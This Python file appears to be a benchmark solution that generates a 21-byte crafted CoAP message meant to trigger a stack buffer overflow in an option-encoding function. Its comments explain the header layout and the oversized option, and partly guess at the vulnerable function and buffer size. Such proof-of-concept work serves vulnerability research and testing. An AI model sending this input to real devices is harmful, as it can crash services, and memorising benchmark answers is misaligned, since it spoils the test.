import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The Proof-of-Concept is a crafted 21-byte CoAP message. The vulnerability
        # is a stack buffer overflow in a function that appends a CoAP option,
        # likely named `AppendUintOption`. The overflow is triggered by providing
        # an option that, when serialized, exceeds the size of a small, fixed-size
        # stack buffer.
        #
        # The key is to construct an option whose serialized form is large. The size
        # is determined by the option header and the option value.
        # - A large option value (a 64-bit integer) requires 8 bytes.
        # - A large option delta (difference from the previous option number)
        #   requires an extended header, making the header 3 bytes long.
        #
        # The total size of this malicious option becomes 3 (header) + 8 (value) = 11 bytes.
        # When this is written to a stack buffer of, for example, 8 bytes, it causes a
        # 3-byte overflow, triggering the crash.
        #
        # The full 21-byte PoC is structured to meet the ground-truth length, which
        # implies certain message features (like a token) are required to reach the
        # vulnerable code path.

        # 1. CoAP Header (4 bytes)
        # Version=1, Type=0 (Confirmable), Token Length=5
        ver_type_tkl = 0b01000101  # 0x45
        # Code=0.01 (GET)
        code = 0x01
        # Message ID (arbitrary)
        msg_id = 0x1337
        header = struct.pack('!BBH', ver_type_tkl, code, msg_id)

        # 2. Token (5 bytes)
        token = b'pwned'

        # 3. First Option (1 byte)
        # A simple option to set the "previous option number" state to 1.
        # This is necessary to create a large delta for the second option.
        # Option Delta = 1, Option Length = 0 -> Header byte = (1 << 4) | 0 = 0x10.
        option1 = b'\x10'

        # 4. Second Option (11 bytes) - The trigger
        # To create a large delta, we choose option number 300.
        # Previous option number is 1, so Delta = 300 - 1 = 299.
        # Since Delta (299) >= 269, CoAP uses a 2-byte extended delta field.
        # The extended delta value is 299 - 269 = 30.
        # The option value is a 64-bit integer, so its length is 8.
        #
        # Header byte: (delta_nibble=14 << 4) | (length_nibble=8) = 0xE8.
        option2_header_byte = 0xE8
        extended_delta = 30
        option2_value = 2**63  # A large value to force 8-byte encoding.
        
        option2 = struct.pack('!BHQ', option2_header_byte, extended_delta, option2_value)

        # Assemble the final PoC
        poc = header + token + option1 + option2
        
        return poc
